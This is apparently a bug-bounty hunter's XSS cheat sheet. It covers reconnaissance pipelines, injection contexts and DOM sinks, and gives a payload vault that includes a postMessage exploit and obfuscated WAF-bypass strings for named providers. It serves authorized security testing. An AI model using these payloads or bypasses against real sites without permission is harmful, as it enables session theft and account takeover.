---
tags: [bugbounty, vuln/xss, cheatsheet, p1, p2, p3]
aliases: [Cross-Site Scripting, XSS]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# XSS — Cross-Site Scripting

> [!tldr] Hunter Summary
> **What:** Injecting JS that executes in victim's browser context.
> **Impact:** Cookie theft, ATO, keylogging, phishing, stored = P1.
> **Best payout targets:** Stored XSS in admin panels, postMessage without origin check, DOM XSS via sink.
> **Time to triage:** Reflected = 5 min. DOM = 20 min. Stored = test all user-supplied fields.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| Reflected params | `q=`, `search=`, `name=`, `msg=`, `error=`, `redirect=` |
| Stored fields | Comments, bios, product names, chat, support tickets |
| DOM sinks | `innerHTML`, `document.write`, `location.href`, `eval()`, `.html()` |
| Headers echoed | `X-Forwarded-For`, `Referer`, `User-Agent` reflected in response |
| File names | Upload filename reflected in response page |
| Markdown/rich text | Any WYSIWYG or markdown renderer |
| Email fields | `"<svg/onload=alert(1)>"@gmail.com` accepted by PHP validators |

---

## Step-by-Step Hunt

### Step 1 — Map reflection points
```bash
# Feed all URLs with params through dalfox
cat urls.txt | dalfox pipe --silence

# Or: qsreplace + kxss for fast filter
cat urls.txt | qsreplace '"><script>alert(1)</script>' | kxss

# Find params automatically
katana -u https://target.com -jc | grep "=" | dalfox pipe
```

### Step 2 — Identify the injection context
Before trying payloads, view source and find where your input lands:

| Context | Test input | Starter payload |
|---------|-----------|-----------------|
| HTML body | `<b>test</b>` | `<script>alert(1)</script>` |
| HTML attribute (quoted) | `" test"` | `" onfocus=alert(1) autofocus x="` |
| JS string (single quote) | `'test'` | `'-alert(1)-'` |
| JS template literal | `` `test` `` | `${alert(1)}` |
| HTML comment | `<!-- test -->` | `--><script>alert(1)</script>` |
| Inside `<script>` tag | `var x='test'` | `</script><script>alert(1)</script>` |

### Step 3 — DOM XSS: trace sources → sinks
Open DevTools → Sources tab. Search for dangerous sinks:
```
innerHTML  outerHTML  document.write  insertAdjacentHTML
eval  setTimeout  setInterval  Function(
location.href  location.hash  window.location
$.html(  $.parseHTML(  dangerouslySetInnerHTML
```
Trace: `location.search` → `location.hash` → `document.referrer` → `window.name` → `postMessage`

```bash
# DOM Invader in Burp automates this
# Or manual: grep JS files
gau target.com | grep "\.js" | httpx -mc 200 | while read url; do
  curl -s "$url" | grep -E "innerHTML|document\.write|eval\("
done
```

### Step 4 — Try filter bypasses (if basic fails)
```html
<!-- Event handlers (no < needed) -->
" onmouseover=alert(1) x="
" autofocus onfocus=alert(1) "
" onanimationstart=alert(1) style=animation-name:x "

<!-- Encoding -->
<img src=x onerror=&#x61;lert(1)>
<svg onload=alert(1)>

<!-- Tag variation -->
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>
<body onload=alert(1)>

<!-- Script context -->
'-alert(1)-'
\'-alert(1)//
${alert(1)}
```

### Step 5 — Stored XSS: test every user input field
Profile fields, display name, address, bio, comments, tags, product descriptions, support tickets. Submit with stored payload, then visit the page where it renders (especially admin views).

### Step 6 — Check CSP
```bash
curl -sI https://target.com | grep -i content-security-policy
# paste value into https://csp-evaluator.withgoogle.com/
```
Weak CSP signals: `'unsafe-inline'`, wildcard CDN, no `script-src`, JSONP on same origin.

### Step 7 — Document + escalate
- Stored XSS affecting other users = P1/P2
- Self-XSS only = not reportable alone (chain it)
- XSS in admin panel = P1
- XSS + CSP bypass = escalate severity

---

## Payload Vault

### Context-matched

```html
<!-- HTML body -->
<script>alert(document.domain)</script>
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>

<!-- Attribute (quoted) -->
" onfocus=alert(1) autofocus x="
" onmouseover=alert(1) "

<!-- JS string -->
'-alert(1)-'
'/alert(1)//

<!-- Template literal -->
${alert(1)}
`${alert(1)}`

<!-- Inside <script> block -->
</script><script>alert(1)</script>

<!-- Markdown -->
[x](javascript:alert(1))

<!-- SVG upload -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<!-- Filename in upload -->
"><svg onload=alert(1)>.jpg

<!-- XML page -->
<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
```

### Multi-reflection

```html
<!-- Double reflection -->
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='

<!-- Triple reflection -->
*/alert(1)">'onload="/*<svg/1='
```

### postMessage exploit

```html
<!-- If target has unguarded postMessage handler -->
<iframe src="https://target.com/page" id="f"></iframe>
<script>
  f.onload = () => f.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
</script>
```

---

## WAF Bypass Payloads

```html
<!-- Cloudflare -->
<svg%0Aonauxclick=0;[1].some(confirm)//
<svg/onload={alert`1`}>
"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

<!-- Imperva -->
<x/onclick=globalThis['pro'+'mpt']&lt;)>clickme
<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>
<svg/onload=self[`aler`%2b`t`]`1`>

<!-- ModSecurity -->
<a href="jav%0Dascript&colon;alert(1)">

<!-- Generic encoding -->
%3Csvg%20onload%3Dalert(1)%3E
%253Csvg%2520onload%253Dalert%281%29%253E
```

---

## 2025-2026 Updates

> [!info] New attack surface (2025-2026)
> - **AI chatbot injection:** User-controlled input fed into LLM output rendered in browser without sanitization — treat AI-generated HTML as untrusted
> - **Web Components / Shadow DOM:** `attachShadow` doesn't isolate XSS if inner HTML is set from unescaped data
> - **React 18 dangerouslySetInnerHTML:** Still common in migration code — grep for it
> - **mXSS via DOMPurify < 3.1.0:** Mutation XSS via nested `<form>` + MathML still works on older versions
> - **Trusted Types bypass:** Missing `default` policy allows raw DOM manipulation fallback
> - **iframe sandbox misuse:** `allow-scripts` + `allow-same-origin` together negates sandbox isolation

```bash
# Find React components with dangerouslySetInnerHTML
grep -r "dangerouslySetInnerHTML" --include="*.js" --include="*.jsx" --include="*.tsx" .

# Check for DOMPurify version
grep -r "dompurify" package-lock.json 2>/dev/null | grep '"version"'
```

---

## Chain Ideas

| Base | + | Escalates to |
|------|---|-------------|
| Self-XSS | + CSRF login | P2 stored XSS affecting others |
| Reflected XSS | + clickjacking | Phishing / cookie steal without CORS |
| XSS | + postMessage | Cross-origin data steal |
| Stored XSS in admin | - | P1 full account takeover |
| XSS | + OAuth implicit flow | Token theft in URL fragment |

---

## Tools

| Tool | Use |
|------|-----|
| `dalfox` | Automated XSS scanner, pipe mode |
| `kxss` | Fast XSS reflection detector |
| `qsreplace` | Bulk param replacement for testing |
| Burp DOM Invader | Interactive DOM XSS tracing |
| `gxss` | Param reflection finder |
| CSP Evaluator | https://csp-evaluator.withgoogle.com |

---

## References

- Brute Logic — https://brutelogic.com.br/
- PortSwigger XSS labs — https://portswigger.net/web-security/cross-site-scripting
- Awesome-WAF payloads — https://github.com/0xInfection/Awesome-WAF
- hahwul dalfox — https://github.com/hahwul/dalfox
- DOMPurify changelogs (check for mXSS fixes)
